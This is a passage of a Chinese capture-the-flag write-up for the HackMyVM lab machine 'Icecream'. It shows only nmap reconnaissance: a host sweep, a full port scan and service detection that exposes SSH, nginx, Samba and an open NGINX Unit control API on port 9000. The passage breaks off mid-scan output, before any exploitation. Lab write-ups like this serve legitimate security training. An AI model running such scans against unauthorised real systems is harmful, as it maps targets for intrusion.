{"pageProps":{"postData":{"id":"HackMyVMIcecream","contentHtml":"<h1>Icecream.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Icecream\">https://hackmyvm.eu/machines/machine.php?vm=Icecream</a></p>\n</blockquote>\n<p>Notes：<strong>Hack and fun!</strong></p>\n<h2>前期踩点</h2>\n<p><code>192.168.56.39</code>是靶机</p>\n<pre><code class=\"hljs language-css\">⚡ root<span class=\"hljs-keyword\">@kali</span>  ~  nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94S</span>VN ( <span class=\"hljs-attribute\">https</span>://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">02</span>-<span class=\"hljs-number\">28</span> <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">06</span> EST\nNmap <span class=\"hljs-attribute\">scan</span> report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>\nHost is up (<span class=\"hljs-number\">0.00061s</span> latency).\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">0</span><span class=\"hljs-attribute\">A</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">09</span> (Unknown)\nNmap <span class=\"hljs-attribute\">scan</span> report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>\nHost is up (<span class=\"hljs-number\">0.00037s</span> latency).\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">72</span>:FB (Oracle VirtualBox virtual NIC)\nNmap <span class=\"hljs-attribute\">scan</span> report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.39</span>\nHost is up (<span class=\"hljs-number\">0.00027s</span> latency).\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">1</span>D (Oracle VirtualBox virtual NIC)\nNmap <span class=\"hljs-attribute\">scan</span> report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>\nHost is up.\nNmap <span class=\"hljs-attribute\">done</span>: <span class=\"hljs-number\">256</span> IP addresses (<span class=\"hljs-number\">4</span> hosts up) scanned in <span class=\"hljs-number\">15.11</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-arduino\">⚡ root@kali  ~  nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.39</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-02-28 08:08 EST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.39</span>\nHost is <span class=\"hljs-built_in\">up</span> (<span class=\"hljs-number\">0.00042</span>s latency).\nNot shown: <span class=\"hljs-number\">65530</span> closed tcp <span class=\"hljs-built_in\">ports</span> (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   open  ssh\n<span class=\"hljs-number\">80</span>/tcp   open  http\n<span class=\"hljs-number\">139</span>/tcp  open  netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp  open  microsoft-ds\n<span class=\"hljs-number\">9000</span>/tcp open  cslistener\nMAC Address: <span class=\"hljs-number\">0</span>8:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">1</span>D (Oracle VirtualBox <span class=\"hljs-keyword\">virtual</span> NIC)\n</code></pre>\n<pre><code class=\"hljs language-swift\"><span class=\"hljs-operator\">⚡</span> root<span class=\"hljs-meta\">@kali</span>  <span class=\"hljs-operator\">~</span>  nmap <span class=\"hljs-operator\">-</span>sT <span class=\"hljs-operator\">-</span><span class=\"hljs-type\">A</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-type\">T4</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-type\">O</span> <span class=\"hljs-operator\">-</span>p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">9000</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.39</span>\n<span class=\"hljs-type\">Starting</span> <span class=\"hljs-type\">Nmap</span> <span class=\"hljs-number\">7</span>.94SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-02-28 08:09 EST</span>\n<span class=\"hljs-type\">Nmap</span> scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.39</span>\n<span class=\"hljs-type\">Host</span> <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0</span>.00048s latency).\n\n<span class=\"hljs-type\">PORT</span>     <span class=\"hljs-type\">STATE</span> <span class=\"hljs-type\">SERVICE</span>     <span class=\"hljs-type\">VERSION</span>\n<span class=\"hljs-number\">22</span><span class=\"hljs-operator\">/</span>tcp   <span class=\"hljs-keyword\">open</span>  ssh         <span class=\"hljs-type\">OpenSSH</span> <span class=\"hljs-number\">9</span>.2p1 <span class=\"hljs-type\">Debian</span> <span class=\"hljs-number\">2</span><span class=\"hljs-operator\">+</span>deb12u3 (<span class=\"hljs-keyword\">protocol</span> <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-operator\">|</span> ssh<span class=\"hljs-operator\">-</span>hostkey:\n<span class=\"hljs-operator\">|</span>   <span class=\"hljs-number\">256</span> <span class=\"hljs-number\">68</span>:<span class=\"hljs-number\">94</span>:ca:2f:f7:<span class=\"hljs-number\">62</span>:<span class=\"hljs-number\">45</span>:<span class=\"hljs-number\">56</span>:a4:<span class=\"hljs-number\">67</span>:<span class=\"hljs-number\">84</span>:<span class=\"hljs-number\">59</span>:1b:fe:e9:bc (<span class=\"hljs-type\">ECDSA</span>)\n<span class=\"hljs-operator\">|</span><span class=\"hljs-keyword\">_</span>  <span class=\"hljs-number\">256</span> 3b:<span class=\"hljs-number\">79</span>:1a:<span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">81</span>:af:<span class=\"hljs-number\">75</span>:c2:c1:2e:4e:f5:a3:9c:c9:e3 (<span class=\"hljs-type\">ED25519</span>)\n<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>tcp   <span class=\"hljs-keyword\">open</span>  http        nginx <span class=\"hljs-number\">1.22</span>.<span class=\"hljs-number\">1</span>\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>title: <span class=\"hljs-number\">403</span> <span class=\"hljs-type\">Forbidden</span>\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>server<span class=\"hljs-operator\">-</span>header: nginx<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">1.22</span>.<span class=\"hljs-number\">1</span>\n<span class=\"hljs-number\">139</span><span class=\"hljs-operator\">/</span>tcp  <span class=\"hljs-keyword\">open</span>  netbios<span class=\"hljs-operator\">-</span>ssn <span class=\"hljs-type\">Samba</span> smbd <span class=\"hljs-number\">4.6</span>.<span class=\"hljs-number\">2</span>\n<span class=\"hljs-number\">445</span><span class=\"hljs-operator\">/</span>tcp  <span class=\"hljs-keyword\">open</span>  netbios<span class=\"hljs-operator\">-</span>ssn <span class=\"hljs-type\">Samba</span> smbd <span class=\"hljs-number\">4.6</span>.<span class=\"hljs-number\">2</span>\n<span class=\"hljs-number\">9000</span><span class=\"hljs-operator\">/</span>tcp <span class=\"hljs-keyword\">open</span>  cslistener<span class=\"hljs-operator\">?</span>\n<span class=\"hljs-operator\">|</span> fingerprint<span class=\"hljs-operator\">-</span>strings:\n<span class=\"hljs-operator\">|</span>   FourOhFourRequest:\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-type\">HTTP</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">1.1</span> <span class=\"hljs-number\">404</span> <span class=\"hljs-type\">Not</span> <span class=\"hljs-type\">Found</span>\n<span class=\"hljs-operator\">|</span>     Server: <span class=\"hljs-type\">Unit</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">1.33</span>.<span class=\"hljs-number\">0</span>\n<span class=\"hljs-operator\">|</span>     Date: <span class=\"hljs-type\">Fri</span>, <span class=\"hljs-number\">28</span> <span class=\"hljs-type\">Feb</span> <span class=\"hljs-number\">2025</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">59</span> <span class=\"hljs-type\">GMT</span>\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-type\">Content</span><span class=\"hljs-operator\">-</span>Type: application<span class=\"hljs-operator\">/</span>json\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-type\">Content</span><span class=\"hljs-operator\">-</span>Length: <span class=\"hljs-number\">40</span>\n<span class=\"hljs-operator\">|</span>     Connection: close\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"error\"</span>: <span class=\"hljs-string\">\"Value doesn't exist.\"</span>\n<span class=\"hljs-operator\">|</span>   GetRequest:\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-type\">HTTP</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">1.1</span> <span class=\"hljs-number\">200</span> <span class=\"hljs-type\">OK</span>\n<span class=\"hljs-operator\">|</span>     Server: <span class=\"hljs-type\">Unit</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">1.33</span>.<span class=\"hljs-number\">0</span>\n<span class=\"hljs-operator\">|</span>     Date: <span class=\"hljs-type\">Fri</span>, <span class=\"hljs-number\">28</span> <span class=\"hljs-type\">Feb</span> <span class=\"hljs-number\">2025</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">58</span> <span class=\"hljs-type\">GMT</span>\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-type\">Content</span><span class=\"hljs-operator\">-</span>Type: application<span class=\"hljs-operator\">/</span>json\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-type\">Content</span><span class=\"hljs-operator\">-</span>Length: <span class=\"hljs-number\">1042</span>\n<span class=\"hljs-operator\">|</span>     Connection: close\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"certificates\"</span>: {},\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"js_modules\"</span>: {},\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"config\"</span>: {\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"listeners\"</span>: {},\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"routes\"</span>: [],                                                                                               \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"applications\"</span>: {}                                                                                          \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"status\"</span>: {                                                                                                 \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"modules\"</span>: {                                                                                                \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"python\"</span>: {                                                                                                 \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"3.11.2\"</span>,                                                                                        \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/python3.11.unit.so\"</span>                                                           \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"php\"</span>: {                                                                                                                                                                                                                      \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"8.2.18\"</span>,                                                                                                                                                                                                          \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/php.unit.so\"</span>                                                                  \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"perl\"</span>: {                                                                                                   \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"5.36.0\"</span>,                                                                                        \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/perl.unit.so\"</span>                                                                 \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"ruby\"</span>: {                                                                                                   \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"3.1.2\"</span>,                                                                                         \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/ruby.unit.so\"</span>                                                                 \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"java\"</span>: {                                                                                                   \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"17.0.11\"</span>,                                                                                       \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/java17.unit.so\"</span>                                                               \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"wasm\"</span>: {                   \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"version\"</span>: <span class=\"hljs-string\">\"0.1\"</span>,                    \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-string\">\"lib\"</span>: <span class=\"hljs-string\">\"/usr/lib/unit/modules/wasm.unit.so\"</span>                                                                 \n<span class=\"hljs-operator\">|</span>   HTTPOptions:            \n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-type\">HTTP</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">1.1</span> <span class=\"hljs-number\">405</span> <span class=\"hljs-type\">Method</span> <span class=\"hljs-type\">Not</span> <span class=\"hljs-type\">Allowed</span>\n<span class=\"hljs-operator\">|</span>     Server: <span class=\"hljs-type\">Unit</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">1.33</span>.<span class=\"hljs-number\">0</span>                              \n<span class=\"hljs-operator\">|</span>     Date: <span class=\"hljs-type\">Fri</span>, <span class=\"hljs-number\">28</span> <span class=\"hljs-type\">Feb</span> <span class=\"hljs-number\">2025</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">59</span> <span class=\"hljs-type\">GMT</span>\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-type\">Content</span><span class=\"hljs-operator\">-</span>Type: application<span class=\"hljs-operator\">/</span>json\n<span class=\"hljs-operator\">|</span>     <span class=\"hljs-type\">Content</span><span class=\"hljs-operator\">-</span>Length: <span class=\"hljs-number\">35</span>                 \n<span class=\"hljs-operator\">|</span>     Connection: close             \n<span class=\"hljs-operator\">|</span><span class=\"hljs-keyword\">_</span>    <span class=\"hljs-string\">\"error\"</span>: <span class=\"hljs-string\">\"Invalid method.\"</span>              \n<span class=\"hljs-number\">1</span> service unrecognized despite returning data. <span class=\"hljs-type\">If</span> you know the service<span class=\"hljs-regexp\">/version, please submit the following fingerprint at https:/</span><span class=\"hljs-regexp\">/nmap.org/</span>cgi<span class=\"hljs-operator\">-</span>bin<span class=\"hljs-operator\">/</span>submit.cgi<span class=\"hljs-operator\">?</span>new<span class=\"hljs-operator\">-</span>service :                                                        \n<span class=\"hljs-type\">SF</span><span class=\"hljs-operator\">-</span><span class=\"hljs-type\">Port9000</span><span class=\"hljs-operator\">-</span>TCP:<span class=\"hljs-type\">V</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">7</span>.94SVN<span class=\"hljs-operator\">%</span><span class=\"hljs-type\">I</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">7</span><span class=\"hljs-operator\">%</span><span class=\"hljs-type\">D</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">28</span><span class=\"hljs-operator\">%</span><span class=\"hljs-type\">Time</span><span class=\"hljs-operator\">=</span>67C1B5A9<span class=\"hljs-operator\">%</span><span class=\"hljs-type\">P</span><span class=\"hljs-operator\">=</span>x86_64<span class=\"hljs-operator\">-</span>pc<span class=\"hljs-operator\">-</span>linux<span class=\"hljs-operator\">-</span>gnu<span class=\"hljs-operator\">%</span>r                                        \nSF:(<span class=\"hljs-type\">GetRequest</span>,4A8,<span class=\"hljs-string\">\"HTTP/1\\.1\\x20200\\x20OK<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Server:\\x20Unit/1\\.33\\.0<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>                                        \nSF:Date:\\x20Fri,\\x2028\\x20Feb\\x202025\\x2013:09:58\\x20GMT<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Content-Type:\\                                        \nSF:x20application/json<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Content-Length:\\x201042<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Connection:\\x20close\\                                        \nSF:r<span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>{<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>certificates<span class=\"hljs-subst\">\\\"</span>:\\x20{},<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>js_modules<span class=\"hljs-subst\">\\\"</span>:\\x20{},<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>\\                                        \nSF:t<span class=\"hljs-subst\">\\\"</span>config<span class=\"hljs-subst\">\\\"</span>:\\x20{<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>listeners<span class=\"hljs-subst\">\\\"</span>:\\x20{},<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>routes<span class=\"hljs-subst\">\\\"</span>:\\x20\\[                                        \nSF:\\],<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>applications<span class=\"hljs-subst\">\\\"</span>:\\x20{}<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span>},<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>status<span class=\"hljs-subst\">\\\"</span>:\\x20{<span class=\"hljs-subst\">\\r</span>\\                                        \nSF:n<span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>modules<span class=\"hljs-subst\">\\\"</span>:\\x20{<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>python<span class=\"hljs-subst\">\\\"</span>:\\x20{<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>version<span class=\"hljs-subst\">\\\"</span>                                        \nSF::\\x20<span class=\"hljs-subst\">\\\"</span>3\\.11\\.2<span class=\"hljs-subst\">\\\"</span>,<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>lib<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>/usr/lib/unit/modules/pytho                                        \nSF:n3\\.11\\.unit\\.so<span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span>},<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>php<span class=\"hljs-subst\">\\\"</span>:\\x20{<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>                                        \nSF:version<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>8\\.2\\.18<span class=\"hljs-subst\">\\\"</span>,<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>lib<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>/usr/lib/unit/modu                                        \nSF:les/php\\.unit\\.so<span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span>},<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>perl<span class=\"hljs-subst\">\\\"</span>:\\x20{<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span>               \nSF:<span class=\"hljs-subst\">\\\"</span>version<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>5\\.36\\.0<span class=\"hljs-subst\">\\\"</span>,<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>lib<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>/usr/lib/unit/mo                                        \nSF:dules/perl\\.unit\\.so<span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span>},<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>ruby<span class=\"hljs-subst\">\\\"</span>:\\x20{<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span>\\                                        \nSF:t<span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>version<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>3\\.1\\.2<span class=\"hljs-subst\">\\\"</span>,<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>lib<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>/usr/lib/unit/                                        \nSF:modules/ruby\\.unit\\.so<span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span>},<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>java<span class=\"hljs-subst\">\\\"</span>:\\x20{<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span>\\                                        \nSF:t<span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>version<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>17\\.0\\.11<span class=\"hljs-subst\">\\\"</span>,<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>lib<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>/usr/lib/u                                        \nSF:nit/modules/java17\\.unit\\.so<span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span>},<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>wasm<span class=\"hljs-subst\">\\\"</span>:\\x20{\\                                        \nSF:r<span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>version<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>0\\.1<span class=\"hljs-subst\">\\\"</span>,<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\\"</span>lib<span class=\"hljs-subst\">\\\"</span>:\\x20<span class=\"hljs-subst\">\\\"</span>/usr/lib/                                        \nSF:unit/modules/wasm\\.unit\\.so<span class=\"hljs-subst\">\\\"</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span>},<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span class=\"hljs-subst\">\\t</span><span class=\"hljs-subst\">\\t</span>\"</span>)<span class=\"hljs-operator\">%</span>r(<span class=\"hljs-type\">HTTPOptions</span>,<span class=\"hljs-type\">C</span>                                                                                                                                                          \nSF:<span class=\"hljs-number\">7</span>,<span class=\"hljs-string\">\"HTTP/1\\.1\\x20405\\x20Method\\x20Not\\x20Allowed<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Server:\\x20Unit/1\\.3                                                                                                                                                          \nSF:3\\.0<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Date:\\x20Fri,\\x2028\\x20Feb\\x202025\\x2013:09:59\\x20GMT<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Conten                                        \nSF:t-Type:\\x20application/json<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Content-Length:\\x2035<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span>Connection:\\x20                                        \nSF:close<span class=\"hljs-subst\">\\r</span><span class=\"hljs-subst\">\\n</span><span 